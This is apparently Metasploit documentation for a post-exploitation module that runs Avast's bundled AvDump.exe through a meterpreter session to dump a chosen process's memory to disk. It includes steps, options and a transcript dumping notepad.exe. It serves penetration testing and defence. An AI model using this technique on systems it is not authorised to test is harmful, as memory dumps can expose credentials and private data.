### Vulnerable Application -  Avast Home Security Suite - Avdump.exe

The Avast Home Security suite ships with a memory dumping utility that can be
leveraged to dump process memory of user defined processes to user defined 
locations.


A detailed write up can be found at https://archcloudlabs.com/projects/dumping-memory-with-av/


## Verification Steps

Verify that the path ```C:\\Program Files\\Avast Software Avast\\AvDump.exe```
exists.
1. Start msfconsole
2. Get meterpreter session
3. Do: ```use post/windows/gather/avast_memory_dump```
4. Do: ```set SESSION <session id>```
5. Do: ```set DUMP_PATH <specify path dest>```
6. Do: ```set PID <pid>```
7. Do: ```run```

## Options

**PID** 
Specify the PID of the process you would like to dump.

**DUMP_PATH** 
Specify the location to write the memory dump to.

##  Scenarios  

### Windows 10 (2004 OS Build 19041.572)
```
msf5 > search avast

Matching Modules
================

   #  Name                                   Disclosure Date  Rank    Check  Description
   -  ----                                   ---------------  ----    -----  -----------
   0  post/windows/gather/avast_memory_dump                   normal  No     Avast AV Memory Dumping Utility


msf5 > use 0

msf5 post(windows/gather/avast_memory_dump) > sessions -C 'ps -N notepad.exe'
[*] Running 'ps -N notepad.exe' on meterpreter session 4 (192.168.218.131)
Filtering on 'notepad.exe'

Process List
============

 PID   PPID  Name         Arch  Session  User                  Path
 ---   ----  ----         ----  -------  ----                  ----
 8504  1812  notepad.exe  x64   1        DESKTOP-CD2VHVO\user  C:\Windows\System32\notepad.exe

msf5 post(windows/gather/avast_memory_dump) > show options

Module options (post/windows/gather/avast_memory_dump):

   Name       Current Setting           Required  Description
   ----       ---------------           --------  -----------
   DUMP_PATH  C:\Users\Public\test.dmp  yes       specify location to write dump file to
   PID        8504                      yes       specify pid to dump
   SESSION    4                         yes       The session to run this module on.
   
msf5 post(windows/gather/avast_memory_dump) > set PID 8504
PID => 8504

msf5 post(windows/gather/avast_memory_dump) > set SESSION 4
SESSION => 4

msf5 post(windows/gather/avast_memory_dump) > run

[*] [2020.10.21-22:49:24] AvDump.exe exists!
[*] [2020.10.21-22:49:24] executing Avast mem dump utility against 8504 to C:\Users\Public\test.dmp
[*] [2020.10.21-22:49:29] [2020-10-22 02:49:26.969] [info   ] [dump       ] [ 1400: 8032] Dumpmaster is arming.
[2020-10-22 02:49:27.047] [info   ] [dump       ] [ 1400: 8032] Successfully dumped process 8504 into 'C:\Users\Public\test.dmp'
[2020-10-22 02:49:27.047] [info   ] [log_module ] [ 1400: 8032] LogModule is going to be destroyed.
[2020-10-22 02:49:27.047] [info   ] [log_module ] [ 1400: 8032] =====================================================================================================================
[*] Post module execution completed

```

